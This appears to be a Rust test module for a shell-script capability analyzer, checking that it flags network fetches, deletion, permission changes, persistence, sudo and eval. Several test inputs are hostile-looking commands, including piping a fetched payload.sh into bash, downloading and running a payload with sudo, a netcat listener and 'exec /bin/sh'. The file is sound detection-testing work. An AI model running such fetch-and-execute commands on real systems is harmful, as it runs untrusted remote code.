use crate::analyzers::{shell::ShellAnalyzer, Analyzer};
use crate::types::AnalysisReport;

mod tests {
    use super::*;
    use std::io::Write;
    use tempfile::NamedTempFile;

    #[allow(dead_code)]
    fn analyze_shell_code(code: &str) -> AnalysisReport {
        let mut temp_file = NamedTempFile::new().unwrap();
        temp_file.write_all(code.as_bytes()).unwrap();
        temp_file.flush().unwrap();

        let analyzer = ShellAnalyzer::new();
        analyzer.analyze(temp_file.path()).unwrap()
    }

    #[test]
    fn test_simple_script() {
        let script = r#"#!/bin/bash
curl https://example.com/payload.sh | bash
rm -rf /tmp/test
"#;

        let report = analyze_shell_code(script);

        // Should detect curl, bash, and rm capabilities
        assert!(report.findings.len() >= 2);
        assert!(report.findings.iter().any(|c| c.id.contains("http")));
        assert!(report.findings.iter().any(|c| c.id.contains("delete")));
    }

    #[test]
    fn test_detect_curl() {
        let script = "#!/bin/bash\ncurl https://example.com/data.txt";
        let report = analyze_shell_code(script);

        assert!(report.findings.iter().any(|c| c.id == "net/http/client"));
    }

    #[test]
    fn test_detect_wget() {
        let script = "#!/bin/bash\nwget https://example.com/file.tar.gz";
        let report = analyze_shell_code(script);

        assert!(report.findings.iter().any(|c| c.id == "net/http/client"));
    }

    #[test]
    fn test_detect_netcat() {
        let script = "#!/bin/bash\nnc -l 4444";
        let report = analyze_shell_code(script);

        assert!(report.findings.iter().any(|c| c.id == "net/socket/connect"));
    }

    #[test]
    fn test_detect_eval() {
        let script = "#!/bin/bash\neval \"echo hello\"";
        let report = analyze_shell_code(script);

        assert!(report.findings.iter().any(|c| c.id == "exec/script/eval"));
    }

    #[test]
    fn test_detect_exec() {
        let script = "#!/bin/bash\nexec /bin/sh";
        let report = analyze_shell_code(script);

        assert!(report.findings.iter().any(|c| c.id == "exec/script/eval"));
    }

    #[test]
    fn test_detect_rm() {
        let script = "#!/bin/bash\nrm -rf /tmp/data";
        let report = analyze_shell_code(script);

        assert!(report.findings.iter().any(|c| c.id == "fs/delete"));
    }

    #[test]
    fn test_detect_chmod() {
        let script = "#!/bin/bash\nchmod +x script.sh";
        let report = analyze_shell_code(script);

        assert!(report.findings.iter().any(|c| c.id == "fs/permissions"));
    }

    #[test]
    fn test_detect_chown() {
        let script = "#!/bin/bash\nchown root:root file.txt";
        let report = analyze_shell_code(script);

        assert!(report.findings.iter().any(|c| c.id == "fs/permissions"));
    }

    #[test]
    fn test_detect_crontab() {
        let script = "#!/bin/bash\ncrontab -e";
        let report = analyze_shell_code(script);

        assert!(report.findings.iter().any(|c| c.id == "persistence/cron"));
    }

    #[test]
    fn test_detect_systemctl() {
        let script = "#!/bin/bash\nsystemctl start nginx";
        let report = analyze_shell_code(script);

        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "persistence/service"));
    }

    #[test]
    fn test_detect_service() {
        let script = "#!/bin/bash\nservice apache2 restart";
        let report = analyze_shell_code(script);

        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "persistence/service"));
    }

    #[test]
    fn test_detect_sudo() {
        let script = "#!/bin/bash\nsudo apt-get update";
        let report = analyze_shell_code(script);

        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "privilege/escalation"));
    }

    #[test]
    fn test_detect_bash_execution() {
        let script = "#!/bin/bash\nbash -c 'echo hello'";
        let report = analyze_shell_code(script);

        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
    }

    #[test]
    fn test_structural_feature() {
        let script = "#!/bin/bash\necho hello";
        let report = analyze_shell_code(script);

        assert!(report
            .structure
            .iter()
            .any(|s| s.id == "source/language/shell"));
    }

    #[test]
    fn test_multiple_capabilities() {
        let script = r#"#!/bin/bash
curl https://example.com/payload
chmod +x payload
sudo ./payload
rm payload
"#;
        let report = analyze_shell_code(script);

        assert!(report.findings.len() >= 4);
        assert!(report.findings.iter().any(|c| c.id == "net/http/client"));
        assert!(report.findings.iter().any(|c| c.id == "fs/permissions"));
        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "privilege/escalation"));
        assert!(report.findings.iter().any(|c| c.id == "fs/delete"));
    }

    #[test]
    fn test_can_analyze_with_sh_shebang() {
        let mut temp_file = NamedTempFile::new().unwrap();
        temp_file.write_all(b"#!/bin/sh\necho hello").unwrap();
        temp_file.flush().unwrap();

        let analyzer = ShellAnalyzer::new();
        assert!(analyzer.can_analyze(temp_file.path()));
    }

    #[test]
    fn test_can_analyze_with_bash_shebang() {
        let mut temp_file = NamedTempFile::new().unwrap();
        temp_file.write_all(b"#!/bin/bash\necho hello").unwrap();
        temp_file.flush().unwrap();

        let analyzer = ShellAnalyzer::new();
        assert!(analyzer.can_analyze(temp_file.path()));
    }

    #[test]
    fn test_can_analyze_with_env_bash_shebang() {
        let mut temp_file = NamedTempFile::new().unwrap();
        temp_file
            .write_all(b"#!/usr/bin/env bash\necho hello")
            .unwrap();
        temp_file.flush().unwrap();

        let analyzer = ShellAnalyzer::new();
        assert!(analyzer.can_analyze(temp_file.path()));
    }

    #[test]
    fn test_cannot_analyze_without_shebang() {
        let mut temp_file = NamedTempFile::new().unwrap();
        temp_file.write_all(b"echo hello").unwrap();
        temp_file.flush().unwrap();

        let analyzer = ShellAnalyzer::new();
        assert!(!analyzer.can_analyze(temp_file.path()));
    }
}
